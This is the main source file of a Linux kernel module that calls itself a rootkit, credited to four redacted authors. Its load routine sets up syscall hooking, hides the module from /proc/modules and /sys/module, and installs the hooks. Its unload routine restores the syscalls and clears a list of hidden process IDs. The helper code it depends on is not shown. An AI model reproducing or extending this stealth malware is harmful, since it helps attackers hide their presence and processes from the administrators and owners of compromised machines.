#include "rootkit_main.h"

#include "hooking.h"
#include "syscall_hooks.h"
#include "utils.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
MODULE_DESCRIPTION("A Linux kernel rootkit");
MODULE_VERSION("0.1");

static int __init rootkit_init(void)
{
    int i32_err;

    pr_info("[ROOTKIT] Module loading...\n");

    // Initialize hooking
    i32_err = init_hooking();

    IF_U (i32_err != 0) {
        pr_err("[ROOTKIT] Failed to initialize hooking\n");
        return i32_err;
    }

    // Hide the rootkit from /proc/modules and /sys/module/
    hide_module();

    hook_syscalls(P_SYSCALL_HOOKS);

    pr_info("[ROOTKIT] Module loaded\n");
    return 0;
}

static __exit void rootkit_exit(void)
{
    // Restore original syscall functions
    unhook_syscalls(P_SYSCALL_HOOKS);

    // Clear the list of hidden PIDs
    show_all_processes();

    pr_info("[ROOTKIT] Module unloaded\n");
    return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
